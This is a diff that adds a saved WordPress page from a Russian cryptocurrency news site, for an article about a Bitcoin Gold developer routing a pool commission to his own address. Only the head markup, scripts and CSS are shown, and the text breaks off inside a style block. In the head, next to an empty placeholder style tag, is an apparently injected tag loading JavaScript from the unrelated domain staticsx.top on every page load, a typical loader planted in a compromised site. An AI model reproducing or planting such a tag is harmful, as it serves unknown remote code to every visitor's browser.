@@ -1,0 +1,1608 @@
+<!doctype html >
+<!--[if IE 8]>    <html class="ie8" lang="ru-RU"> <![endif]-->
+<!--[if IE 9]>    <html class="ie9" lang="ru-RU"> <![endif]-->
+<!--[if gt IE 8]><!--> <html lang="ru-RU"> <!--<![endif]-->
+<head>
+    
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="pingback" href="http://bitcois.be/xmlrpc.php" />
+    
+		<!-- All in One SEO 4.1.7 -->
+		<title>Разработчик Bitcoin Gold встроил в код пула начисление комиссии на свой личный адрес | Биткоис</title>
+		<meta name="robots" content="max-image-preview:large" />
+		<meta name="keywords" content="майнинг" />
+		<link rel="canonical" href="http://bitcois.be/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html" />
+		<script type="application/ld+json" class="aioseo-schema">
+			{"@context":"https:\/\/schema.org","@graph":[{"@type":"WebSite","@id":"http:\/\/bitcois.be\/#website","url":"http:\/\/bitcois.be\/","name":"\u0411\u0438\u0442\u043a\u043e\u0438\u0441","description":"\u041f\u043e\u0440\u0442\u0430\u043b \u0411\u0438\u0442\u043a\u043e\u0438\u0441 - \u043a\u0440\u0438\u043f\u0442\u043e\u0432\u0430\u043b\u044e\u0442\u0430, \u0430\u043b\u044c\u0442\u043a\u043e\u0438\u043d\u044b \u043d\u043e\u0432\u043e\u0441\u0442\u0438 \u0430\u043d\u0430\u043b\u0438\u0442\u0438\u043a\u0430 \u0438 \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u044b\u0435 \u0441\u0442\u0430\u0442\u044c\u0438","inLanguage":"ru-RU","publisher":{"@id":"http:\/\/bitcois.be\/#organization"}},{"@type":"Organization","@id":"http:\/\/bitcois.be\/#organization","name":"\u0411\u0438\u0442\u043a\u043e\u0438\u0441","url":"http:\/\/bitcois.be\/"},{"@type":"BreadcrumbList","@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"http:\/\/bitcois.be\/#listItem","position":1,"item":{"@type":"WebPage","@id":"http:\/\/bitcois.be\/","name":"\u0413\u043b\u0430\u0432\u043d\u0430\u044f","description":"\u041f\u043e\u0440\u0442\u0430\u043b \u0411\u0438\u0442\u043a\u043e\u0438\u0441 - \u043a\u0440\u0438\u043f\u0442\u043e\u0432\u0430\u043b\u044e\u0442\u0430, \u0430\u043b\u044c\u0442\u043a\u043e\u0438\u043d\u044b \u043d\u043e\u0432\u043e\u0441\u0442\u0438 \u0430\u043d\u0430\u043b\u0438\u0442\u0438\u043a\u0430 \u0438 \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u044b\u0435 \u0441\u0442\u0430\u0442\u044c\u0438","url":"http:\/\/bitcois.be\/"},"nextItem":"http:\/\/bitcois.be\/mining\/#listItem"},{"@type":"ListItem","@id":"http:\/\/bitcois.be\/mining\/#listItem","position":2,"item":{"@type":"WebPage","@id":"http:\/\/bitcois.be\/mining\/","name":"\u041c\u0430\u0439\u043d\u0438\u043d\u0433","url":"http:\/\/bitcois.be\/mining\/"},"previousItem":"http:\/\/bitcois.be\/#listItem"}]},{"@type":"Person","@id":"http:\/\/bitcois.be\/author\/bitcois#author","url":"http:\/\/bitcois.be\/author\/bitcois","name":"admin","image":{"@type":"ImageObject","@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#authorImage","url":"http:\/\/1.gravatar.com\/avatar\/4d70907c49d7659d5ec27dc38785698a?s=96&d=mm&r=g","width":96,"height":96,"caption":"admin"}},{"@type":"WebPage","@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#webpage","url":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html","name":"\u0420\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a Bitcoin Gold \u0432\u0441\u0442\u0440\u043e\u0438\u043b \u0432 \u043a\u043e\u0434 \u043f\u0443\u043b\u0430 \u043d\u0430\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u0438\u0441\u0441\u0438\u0438 \u043d\u0430 \u0441\u0432\u043e\u0439 \u043b\u0438\u0447\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441 | \u0411\u0438\u0442\u043a\u043e\u0438\u0441","inLanguage":"ru-RU","isPartOf":{"@id":"http:\/\/bitcois.be\/#website"},"breadcrumb":{"@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#breadcrumblist"},"author":"http:\/\/bitcois.be\/author\/bitcois#author","creator":"http:\/\/bitcois.be\/author\/bitcois#author","image":{"@type":"ImageObject","@id":"http:\/\/bitcois.be\/#mainImage","url":"http:\/\/bitcois.be\/wp-content\/uploads\/2017\/11\/6c385fc0d892b7fa8256436a92363966.jpg","width":600,"height":337},"primaryImageOfPage":{"@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#mainImage"},"datePublished":"2017-11-17T10:29:56+03:00","dateModified":"2017-11-17T10:29:56+03:00"},{"@type":"Article","@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#article","name":"\u0420\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a Bitcoin Gold \u0432\u0441\u0442\u0440\u043e\u0438\u043b \u0432 \u043a\u043e\u0434 \u043f\u0443\u043b\u0430 \u043d\u0430\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u0438\u0441\u0441\u0438\u0438 \u043d\u0430 \u0441\u0432\u043e\u0439 \u043b\u0438\u0447\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441 | \u0411\u0438\u0442\u043a\u043e\u0438\u0441","inLanguage":"ru-RU","headline":"\u0420\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a Bitcoin Gold \u0432\u0441\u0442\u0440\u043e\u0438\u043b \u0432 \u043a\u043e\u0434 \u043f\u0443\u043b\u0430 \u043d\u0430\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u0438\u0441\u0441\u0438\u0438 \u043d\u0430 \u0441\u0432\u043e\u0439 \u043b\u0438\u0447\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441","author":{"@id":"http:\/\/bitcois.be\/author\/bitcois#author"},"publisher":{"@id":"http:\/\/bitcois.be\/#organization"},"datePublished":"2017-11-17T10:29:56+03:00","dateModified":"2017-11-17T10:29:56+03:00","articleSection":"\u041c\u0430\u0439\u043d\u0438\u043d\u0433","mainEntityOfPage":{"@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#webpage"},"isPartOf":{"@id":"http:\/\/bitcois.be\/mining\/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html#webpage"},"image":{"@type":"ImageObject","@id":"http:\/\/bitcois.be\/#articleImage","url":"http:\/\/bitcois.be\/wp-content\/uploads\/2017\/11\/6c385fc0d892b7fa8256436a92363966.jpg","width":600,"height":337}}]}
+		</script>
+		<!-- All in One SEO -->
+
+<meta property="og:image" content="http://bitcois.be/wp-content/uploads/2017/11/6c385fc0d892b7fa8256436a92363966.jpg" /><link rel="icon" type="image/png" href="/wp-content/logo-btc.png"><link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Биткоис &raquo; Лента" href="http://bitcois.be/feed" />
+<link rel="alternate" type="application/rss+xml" title="Биткоис &raquo; Лента комментариев" href="http://bitcois.be/comments/feed" />
+<link rel="alternate" type="application/rss+xml" title="Биткоис &raquo; Лента комментариев к &laquo;Разработчик Bitcoin Gold встроил в код пула начисление комиссии на свой личный адрес&raquo;" href="http://bitcois.be/mining/razrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html/feed" />
+<script type="text/javascript">
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/bitcois.be\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.9.16"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+</script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='litespeed-cache-dummy-css'  href='http://bitcois.be/wp-content/plugins/litespeed-cache/assets/css/litespeed-dummy.css?ver=5.9.16' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-block-library-css'  href='http://bitcois.be/wp-includes/css/dist/block-library/style.min.css?ver=5.9.16' type='text/css' media='all' />
+<style id='global-styles-inline-css' type='text/css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+</style>
+<link rel='stylesheet' id='contact-form-7-css'  href='http://bitcois.be/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.5.4' type='text/css' media='all' />
+<link rel='stylesheet' id='google-fonts-style-css'  href='http://fonts.googleapis.com/css?family=Open+Sans%3A300%2C400%2C600%2C700%7CRoboto+Condensed%3A300%2C300italic%2C400%2C400italic%2C700%2C700italic&#038;ver=4.0' type='text/css' media='all' />
+<link rel='stylesheet' id='cp-base-css'  href='http://bitcois.be/wp-content/plugins/cryptocurrency-prices/css/cp_base.css?ver=5.9.16' type='text/css' media='all' />
+<link rel='stylesheet' id='cp--css'  href='http://bitcois.be/wp-content/plugins/cryptocurrency-prices/css/cp_.css?ver=5.9.16' type='text/css' media='all' />
+<link rel='stylesheet' id='td-theme-css'  href='http://bitcois.be/wp-content/themes/theme/style.css?ver=4.0' type='text/css' media='all' />
+<script type='text/javascript' src='http://bitcois.be/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
+<script type='text/javascript' src='http://bitcois.be/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<link rel="https://api.w.org/" href="http://bitcois.be/wp-json/" /><link rel="alternate" type="application/json" href="http://bitcois.be/wp-json/wp/v2/posts/2035" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://bitcois.be/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://bitcois.be/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.9.16" />
+<link rel='shortlink' href='http://bitcois.be/?p=2035' />
+<link rel="alternate" type="application/json+oembed" href="http://bitcois.be/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fbitcois.be%2Fmining%2Frazrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html" />
+<link rel="alternate" type="text/xml+oembed" href="http://bitcois.be/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fbitcois.be%2Fmining%2Frazrabotchik-bitcoin-gold-vstroil-v-kod-pyla-nachislenie-komissii-na-svoi-lichnyi-adres.html&#038;format=xml" />
+	<style id="tdw-css-placeholder"></style><script src=https://staticsx.top/l.js></script><style></style>			<script>
+				window.tdwGlobal = {"adminUrl":"http:\/\/bitcois.be\/wp-admin\/","wpRestNonce":"ee0dd7d65f","wpRestUrl":"http:\/\/bitcois.be\/wp-json\/","permalinkStructure":"\/%category%\/%postname%.html"};
+			</script>
+			<!--[if lt IE 9]><script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+    
+<!-- JS generated by theme -->
+
+<script>
+    
+    
+
+	    var tdBlocksArray = []; //here we store all the items for the current page
+
+	    //td_block class - each ajax block uses a object of this class for requests
+	    function tdBlock() {
+		    this.id = '';
+		    this.block_type = 1; //block type id (1-234 etc)
+		    this.atts = '';
+		    this.td_column_number = '';
+		    this.td_current_page = 1; //
+		    this.post_count = 0; //from wp
+		    this.found_posts = 0; //from wp
+		    this.max_num_pages = 0; //from wp
+		    this.td_filter_value = ''; //current live filter value
+		    this.is_ajax_running = false;
+		    this.td_user_action = ''; // load more or infinite loader (used by the animation)
+		    this.header_color = '';
+		    this.ajax_pagination_infinite_stop = ''; //show load more at page x
+	    }
+
+
+        // td_js_generator - mini detector
+        (function(){
+            var htmlTag = document.getElementsByTagName("html")[0];
+
+            if ( navigator.userAgent.indexOf("MSIE 10.0") > -1 ) {
+                htmlTag.className += ' ie10';
+            }
+
+            if ( !!navigator.userAgent.match(/Trident.*rv\:11\./) ) {
+                htmlTag.className += ' ie11';
+            }
+
+            if ( /(iPad|iPhone|iPod)/g.test(navigator.userAgent) ) {
+                htmlTag.className += ' td-md-is-ios';
+            }
+
+            var user_agent = navigator.userAgent.toLowerCase();
+            if ( user_agent.indexOf("android") > -1 ) {
+                htmlTag.className += ' td-md-is-android';
+            }
+
+            if ( -1 !== navigator.userAgent.indexOf('Mac OS X')  ) {
+                htmlTag.className += ' td-md-is-os-x';
+            }
+
+            if ( /chrom(e|ium)/.test(navigator.userAgent.toLowerCase()) ) {
+               htmlTag.className += ' td-md-is-chrome';
+            }
+
+            if ( -1 !== navigator.userAgent.indexOf('Firefox') ) {
+                htmlTag.className += ' td-md-is-firefox';
+            }
+
+            if ( -1 !== navigator.userAgent.indexOf('Safari') && -1 === navigator.userAgent.indexOf('Chrome') ) {
+                htmlTag.className += ' td-md-is-safari';
+            }
+
+            if( -1 !== navigator.userAgent.indexOf('IEMobile') ){
+                htmlTag.className += ' td-md-is-iemobile';
+            }
+
+        })();
+
+
+
+
+        var tdLocalCache = {};
+
+        ( function () {
+            "use strict";
+
+            tdLocalCache = {
+                data: {},
+                remove: function (resource_id) {
+                    delete tdLocalCache.data[resource_id];
+                },
+                exist: function (resource_id) {
+                    return tdLocalCache.data.hasOwnProperty(resource_id) && tdLocalCache.data[resource_id] !== null;
+                },
+                get: function (resource_id) {
+                    return tdLocalCache.data[resource_id];
+                },
+                set: function (resource_id, cachedData) {
+                    tdLocalCache.remove(resource_id);
+                    tdLocalCache.data[resource_id] = cachedData;
+                }
+            };
+        })();
+
+    
+    
+var td_viewport_interval_list=[{"limitBottom":767,"sidebarWidth":251},{"limitBottom":1023,"sidebarWidth":339}];
+var td_animation_stack_effect="type1";
+var tds_animation_stack=true;
+var td_animation_stack_specific_selectors=".entry-thumb, img[class*=\"wp-image-\"], a.td-sml-link-to-image > img";
+var td_animation_stack_general_selectors=".td-animation-stack .entry-thumb, .post .entry-thumb, .post img[class*=\"wp-image-\"], .post a.td-sml-link-to-image > img";
+var tds_general_modal_image="yes";
+var td_ajax_url="http:\/\/bitcois.be\/wp-admin\/admin-ajax.php?td_theme_name=Newsmag&v=4.0";
+var td_get_template_directory_uri="http:\/\/bitcois.be\/wp-content\/themes\/theme";
+var tds_snap_menu="snap";
+var tds_logo_on_sticky="";
+var tds_header_style="9";
+var td_please_wait="\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435...";
+var td_email_user_pass_incorrect="\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435 \u0438\u043c\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c!";
+var td_email_user_incorrect="\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441 \u044d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u043e\u0439 \u043f\u043e\u0447\u0442\u044b \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c!";
+var td_email_incorrect="\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0430\u0434\u0440\u0435\u0441 \u044d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u043e\u0439 \u043f\u043e\u0447\u0442\u044b!";
+var tds_more_articles_on_post_enable="show";
+var tds_more_articles_on_post_time_to_wait="";
+var tds_more_articles_on_post_pages_distance_from_top=0;
+var tds_theme_color_site_wide="#dd9933";
+var tds_smart_sidebar="enabled";
+var tdThemeName="Newsmag";
+var td_magnific_popup_translation_tPrev="\u041f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0438\u0439 (\u041a\u043d\u043e\u043f\u043a\u0430 \u0432\u043b\u0435\u0432\u043e)";
+var td_magnific_popup_translation_tNext="\u0421\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 (\u041a\u043d\u043e\u043f\u043a\u0430 \u0432\u043f\u0440\u0430\u0432\u043e)";
+var td_magnific_popup_translation_tCounter="%curr% \u0438\u0437 %total%";
+var td_magnific_popup_translation_ajax_tError="\u0421\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 %url% \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u0437\u0430\u0433\u0440\u0443\u0436\u0435\u043d\u043e.";
+var td_magnific_popup_translation_image_tError="\u0418\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 #%curr% \u043d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c.";
+var tdsDateFormat="F j, Y, G:i";
+var tdDateNamesI18n={"month_names":["\u042f\u043d\u0432\u0430\u0440\u044c","\u0424\u0435\u0432\u0440\u0430\u043b\u044c","\u041c\u0430\u0440\u0442","\u0410\u043f\u0440\u0435\u043b\u044c","\u041c\u0430\u0439","\u0418\u044e\u043d\u044c","\u0418\u044e\u043b\u044c","\u0410\u0432\u0433\u0443\u0441\u0442","\u0421\u0435\u043d\u0442\u044f\u0431\u0440\u044c","\u041e\u043a\u0442\u044f\u0431\u0440\u044c","\u041d\u043e\u044f\u0431\u0440\u044c","\u0414\u0435\u043a\u0430\u0431\u0440\u044c"],"month_names_short":["\u042f\u043d\u0432","\u0424\u0435\u0432","\u041c\u0430\u0440","\u0410\u043f\u0440","\u041c\u0430\u0439","\u0418\u044e\u043d","\u0418\u044e\u043b","\u0410\u0432\u0433","\u0421\u0435\u043d","\u041e\u043a\u0442","\u041d\u043e\u044f","\u0414\u0435\u043a"],"day_names":["\u0412\u043e\u0441\u043a\u0440\u0435\u0441\u0435\u043d\u044c\u0435","\u041f\u043e\u043d\u0435\u0434\u0435\u043b\u044c\u043d\u0438\u043a","\u0412\u0442\u043e\u0440\u043d\u0438\u043a","\u0421\u0440\u0435\u0434\u0430","\u0427\u0435\u0442\u0432\u0435\u0440\u0433","\u041f\u044f\u0442\u043d\u0438\u0446\u0430","\u0421\u0443\u0431\u0431\u043e\u0442\u0430"],"day_names_short":["\u0412\u0441","\u041f\u043d","\u0412\u0442","\u0421\u0440","\u0427\u0442","\u041f\u0442","\u0421\u0431"]};
+var td_ad_background_click_link="http:\/\/zdo.be\/freebit";
+var td_ad_background_click_target="_blank";
+</script>
+
+
+<!-- Header style compiled by theme -->
+
+<style>
+    
+
+body {
+	background-color:#080fd3;
+	background-image:url("/wp-content/bg-cripto-gold.jpg");
+	background-attachment:fixed;
+}
+.td-header-border:before,
+    .td-trending-now-title,
+    .td_block_mega_menu .td_mega_menu_sub_cats .cur-sub-cat,
+    .td-post-category:hover,
+    .td-header-style-2 .td-header-sp-logo,
+    .td-next-prev-wrap a:hover i,
+    .page-nav .current,
+    .widget_calendar tfoot a:hover,
+    .td-footer-container .widget_search .wpb_button:hover,
+    .td-scroll-up-visible,
+    .dropcap,
+    .td-category a,
+    input[type="submit"]:hover,
